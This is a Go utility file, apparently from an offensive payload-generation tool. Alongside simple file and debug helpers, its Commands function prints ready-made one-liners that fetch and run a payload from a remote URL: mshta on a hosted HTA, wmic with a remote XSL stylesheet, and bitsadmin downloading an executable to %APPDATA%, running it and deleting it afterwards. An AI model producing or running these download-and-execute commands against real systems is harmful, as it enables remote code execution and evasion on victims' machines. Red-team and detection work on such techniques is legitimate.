package Utils

import (
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"strings"

	"github.com/fatih/color"
)

var (
	debugging   bool
	debugWriter io.Writer
)

func PrintDebug(debugging bool, format string, v ...interface{}) {
	if debugging {
		debugWriter = os.Stdout
		output := fmt.Sprintf("[DEBUG] ")
		output += format
		fmt.Fprintf(debugWriter, output, v...)
	}
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func Readfile(inputFile string) []string {
	output, err := ioutil.ReadFile(inputFile)
	if err != nil {
		log.Fatal(err)
	}
	return strings.Split(string(output), "\n")
}

func Writefile(outFile, result string) {
	cf, err := os.OpenFile(outFile, os.O_CREATE|os.O_WRONLY, 0644)
	check(err)
	defer cf.Close()
	_, err = cf.Write([]byte(result))
	check(err)
}

func Commands(URL string, CommandLoader string, outFile string) {

	if URL == "" && !strings.Contains(outFile, ".js") && !strings.Contains(outFile, ".hta") && !strings.Contains(outFile, ".xls") {
		fmt.Println(color.GreenString("[+] ") + "Non Executable file extension detected. Use the following to execute it (note that this works from a local instance, webdav or fileshare... not a  webserver):")
		fmt.Println("cscript //E:jscript " + outFile + "")
	}

	if URL != "" && CommandLoader == "hta" {
		URL := URL
		fmt.Println("[*] HTA payload")
		fmt.Println("[*] Can be executed manually by a user or embeded into a one liner command that executes it:")
		if strings.HasSuffix(URL, "/") {
			fmt.Println("mshta.exe " + URL + outFile)
		} else {
			fmt.Println("mshta.exe " + URL + "/" + outFile)
		}
	}
	if URL != "" && CommandLoader == "xsl" {
		URL := URL
		fmt.Println("[*] StyleSheet payload")
		fmt.Println("[*]  One liner command to execute it:")
		if strings.HasSuffix(URL, "/") {
			fmt.Println("wmic computersystem list full /format:\"" + URL + outFile + "\"")
			fmt.Println("wmic computersystem list brief /format:\"" + URL + outFile + "\"")
			fmt.Println("wmic process list brief /format:\"" + URL + outFile + "\"")
		} else {
			fmt.Println("wmic computersystem list full /format:\"" + URL + "/" + outFile + "\"")
			fmt.Println("wmic computersystem list brief /format:\"" + URL + "/" + outFile + "\"")
			fmt.Println("wmic process list brief /format:\"" + URL + "/" + outFile + "\"")
		}
	}

	if URL != "" && CommandLoader == "bits" {
		URL := URL
		fmt.Println("[*] Bitsadmin")
		fmt.Println("[*] One liner command to execute it:")
		if strings.HasSuffix(URL, "/") {

			fmt.Println("bitsadmin /transfer " + outFile + " " + URL + outFile + " %APPDATA%\\" + outFile + " & %APPDATA%\\" + outFile + " & timeout 20 & del %APPDATA%\\" + outFile + "")
		} else {
			fmt.Println("bitsadmin /transfer " + outFile + " " + URL + "/" + outFile + " %APPDATA%\\" + outFile + " & %APPDATA%\\" + outFile + " & timeout 20 & del %APPDATA%\\" + outFile + "")

		}
	}
}
